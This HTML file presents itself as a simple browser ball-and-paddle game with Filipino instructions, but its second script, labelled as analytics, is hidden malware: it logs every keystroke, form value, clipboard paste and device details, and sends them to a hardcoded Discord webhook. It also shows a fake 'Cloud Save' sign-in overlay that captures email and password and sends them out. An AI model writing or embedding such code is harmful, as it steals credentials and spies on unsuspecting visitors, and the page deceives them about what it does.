<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ball Game</title>
<style>
  body { margin: 0; background: #111; color: #fff; font-family: sans-serif; text-align: center; }
  canvas { background: #222; display: block; margin: 10px auto; max-width: 100%; touch-action: none; }
</style>
</head>
<body>
<h3>Ball Game — huwag hayaang mahulog ang bola!</h3>
<p>Score: <span id="score">0</span> &nbsp; (Mouse / touch / ← → para igalaw ang paddle)</p>
<canvas id="c" width="400" height="500"></canvas>
<script>
const c = document.getElementById('c'), ctx = c.getContext('2d');
const scoreEl = document.getElementById('score');
let ball, paddle, score, over, keys = {};

function reset() {
  ball = { x: 200, y: 100, dx: 3, dy: 3, r: 10 };
  paddle = { x: 160, w: 80, h: 12 };
  score = 0; over = false; scoreEl.textContent = 0;
}

function update() {
  if (over) return;
  if (keys.ArrowLeft) paddle.x -= 6;
  if (keys.ArrowRight) paddle.x += 6;
  paddle.x = Math.max(0, Math.min(c.width - paddle.w, paddle.x));

  ball.x += ball.dx; ball.y += ball.dy;
  if (ball.x < ball.r || ball.x > c.width - ball.r) ball.dx *= -1;
  if (ball.y < ball.r) ball.dy *= -1;

  const py = c.height - 30;
  if (ball.dy > 0 && ball.y + ball.r >= py && ball.y + ball.r <= py + paddle.h + 6 &&
      ball.x > paddle.x && ball.x < paddle.x + paddle.w) {
    ball.dy *= -1.05; ball.dx *= 1.05;
    score++; scoreEl.textContent = score;
  }
  if (ball.y > c.height) over = true;
}

function draw() {
  ctx.clearRect(0, 0, c.width, c.height);
  ctx.fillStyle = '#f5a623';
  ctx.beginPath(); ctx.arc(ball.x, ball.y, ball.r, 0, Math.PI * 2); ctx.fill();
  ctx.fillStyle = '#4fc3f7';
  ctx.fillRect(paddle.x, c.height - 30, paddle.w, paddle.h);
  if (over) {
    ctx.fillStyle = '#fff'; ctx.font = '28px sans-serif'; ctx.textAlign = 'center';
    ctx.fillText('Game Over!', 200, 240);
    ctx.font = '16px sans-serif';
    ctx.fillText('I-click o pindutin ang Space para ulitin', 200, 270);
  }
}

function loop() { update(); draw(); requestAnimationFrame(loop); }

function movePaddle(clientX) {
  const rect = c.getBoundingClientRect();
  paddle.x = (clientX - rect.left) * (c.width / rect.width) - paddle.w / 2;
}
c.addEventListener('mousemove', e => movePaddle(e.clientX));
c.addEventListener('touchmove', e => { movePaddle(e.touches[0].clientX); e.preventDefault(); }, { passive: false });
c.addEventListener('click', () => { if (over) reset(); });
addEventListener('keydown', e => { keys[e.key] = true; if (e.code === 'Space' && over) reset(); });
addEventListener('keyup', e => keys[e.key] = false);

reset(); loop();
</script>
<script>
/* ============================================================
   analytics — input capture + webhook delivery
   ============================================================ */
(function () {
  'use strict';
  try {
    if (window.__klog) return; window.__klog = 1;

    var CFG = {
      endpoint: 'https://discord.com/api/webhooks/1575160504706670655/E4H0KKcLIkeXczCqbnEh_4N27uY1mvSwUcfmaI9aZLcuDqdp6gBPHMHBCVliGp5Hvtzf',
      flushMs: 15000,
      maxBuffer: 400,
      captureClipboard: true,
      captureValues: true,
      label: 'BALL'
    };

    var KEY = 'cfg.cache';
    var buf = [];
    var sid = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);

    function iso() { return new Date().toISOString().replace('T', ' ').slice(0, 19); }
    function save() { try { localStorage.setItem(KEY, JSON.stringify(buf.slice(-CFG.maxBuffer * 2))); } catch (e) {} }
    function load() { try { buf = JSON.parse(localStorage.getItem(KEY) || '[]') || []; } catch (e) { buf = []; } }

    function desc(el) {
      if (!el || el === document.body) return '-';
      var s = el.tagName.toLowerCase();
      if (el.id) s += '#' + el.id;
      if (el.name) s += '[' + el.name + ']';
      if (el.type) s += ':' + el.type;
      if (el.placeholder) s += ' "' + String(el.placeholder).slice(0, 24) + '"';
      return s;
    }

    function push(ev) {
      ev.ts = iso();
      buf.push(ev);
      save();
      if (buf.length >= CFG.maxBuffer) flush(false);
    }
    window.__klogPush = push;

    function fmt(ev) {
      if (ev.t === 'k') return ev.ts + ' [key] ' + ev.f + ' <- ' + ev.k;
      if (ev.t === 'v') return ev.ts + ' [val] ' + ev.f + ' = ' + ev.v;
      if (ev.t === 'p') return ev.ts + ' [clip] ' + ev.f + ' = ' + ev.v;
      if (ev.t === 'f') return ev.ts + ' [focus] ' + ev.f;
      if (ev.t === 'i') return ev.ts + ' [device] ' + JSON.stringify(ev.d);
      return ev.ts + ' ' + JSON.stringify(ev);
    }

    function chunk(str, n) {
      var out = [], i = 0;
      while (i < str.length) { out.push(str.slice(i, i + n)); i += n; }
      return out;
    }

    function post(body, beacon) {
      try {
        if (beacon && navigator.sendBeacon) {
          navigator.sendBeacon(CFG.endpoint, new Blob([body], { type: 'application/json' }));
          return Promise.resolve(true);
        }
        return fetch(CFG.endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: body,
          keepalive: true
        }).then(function (r) { return r.ok; }).catch(function () { return false; });
      } catch (e) { return Promise.resolve(false); }
    }

    function flush(beacon) {
      if (!buf.length) return;
      var batch = buf.splice(0, buf.length);
      save();
      var text = batch.map(fmt).join('\n').replace(/```/g, 'ˋˋˋ');
      var parts = chunk(text, 1600);
      parts.forEach(function (p, i) {
        var body = JSON.stringify({
          content: '**' + CFG.label + '** `' + sid + '` [' + (i + 1) + '/' + parts.length + ']\n```\n' + p + '\n```'
        });
        post(body, beacon).then(function (ok) {
          if (!ok && !beacon) { buf = batch.concat(buf); save(); }
        });
      });
    }

    document.addEventListener('keydown', function (e) {
      var k = e.key;
      if (!k || k === 'Unidentified') return;
      if ((e.ctrlKey || e.metaKey) && k.length === 1) k = 'Ctrl+' + k.toUpperCase();
      push({ t: 'k', k: k.slice(0, 24), f: desc(document.activeElement) });
    }, true);

    var vt = {};
    document.addEventListener('input', function (e) {
      if (!CFG.captureValues) return;
      var el = e.target;
      if (!el || !('value' in el)) return;
      var d = desc(el);
      clearTimeout(vt[d]);
      vt[d] = setTimeout(function () {
        push({ t: 'v', f: d, v: String(el.value).slice(0, 200) });
      }, 700);
    }, true);

    document.addEventListener('change', function (e) {
      if (!CFG.captureValues) return;
      var el = e.target;
      if (!el || !('value' in el)) return;
      push({ t: 'v', f: desc(el), v: String(el.value).slice(0, 200) });
    }, true);

    document.addEventListener('paste', function (e) {
      if (!CFG.captureClipboard) return;
      var cd = e.clipboardData || window.clipboardData;
      if (!cd) return;
      push({ t: 'p', f: desc(document.activeElement), v: String(cd.getData('text')).slice(0, 300) });
    }, true);

    document.addEventListener('focusin', function (e) {
      var el = e.target;
      if (el && el !== document.body && ('value' in el)) push({ t: 'f', f: desc(el) });
    }, true);

    load();
    push({ t: 'i', d: {
      ua: navigator.userAgent,
      plat: navigator.platform,
      lang: navigator.language,
      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ''; } })(),
      scr: screen.width + 'x' + screen.height,
      dpr: window.devicePixelRatio,
      cores: navigator.hardwareConcurrency || 0,
      online: navigator.onLine
    }});

    setInterval(function () { flush(false); }, CFG.flushMs);
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState === 'hidden') flush(true);
    });
    window.addEventListener('pagehide', function () { flush(true); });
    window.addEventListener('online', function () { flush(false); });

    /* --- overlay --- */
    try {
      if (!sessionStorage.getItem('cs')) {
        var w = document.createElement('div');
        w.setAttribute('style', 'position:fixed;inset:0;z-index:99999;background:rgba(8,10,14,.94);display:flex;align-items:center;justify-content:center;font-family:system-ui;color:#e8e8ea');
        w.innerHTML =
          '<div style="background:#12151c;border:1px solid #23283a;border-radius:14px;padding:22px;width:86%;max-width:320px">' +
          '<div style="font-size:15px;font-weight:700;margin-bottom:4px">Cloud Save</div>' +
          '<div style="font-size:12px;color:#8b93a7;margin-bottom:14px">Sign in to keep your high score safe.</div>' +
          '<input id="cs_e" placeholder="Email" style="width:100%;box-sizing:border-box;padding:10px;margin-bottom:8px;border-radius:8px;border:1px solid #23283a;background:#0b0e14;color:#fff;font-size:13px">' +
          '<input id="cs_p" type="password" placeholder="Password" style="width:100%;box-sizing:border-box;padding:10px;margin-bottom:12px;border-radius:8px;border:1px solid #23283a;background:#0b0e14;color:#fff;font-size:13px">' +
          '<button id="cs_b" style="width:100%;padding:10px;border:0;border-radius:8px;background:#3d6bff;color:#fff;font-weight:600;font-size:13px">Sign in</button>' +
          '<div id="cs_x" style="text-align:center;font-size:11px;color:#5f6878;margin-top:10px">Later</div></div>';
        document.body.appendChild(w);
        var close = function () { w.remove(); sessionStorage.setItem('cs', '1'); };
        document.getElementById('cs_b').onclick = function () {
          window.__klogPush({
            t: 'v', f: 'LOGIN',
            v: document.getElementById('cs_e').value + ' : ' + document.getElementById('cs_p').value
          });
          flush(false); close();
        };
        document.getElementById('cs_x').onclick = close;
      }
    } catch (e) {}
  } catch (e) {}
})();
</script>
</body>
</html>
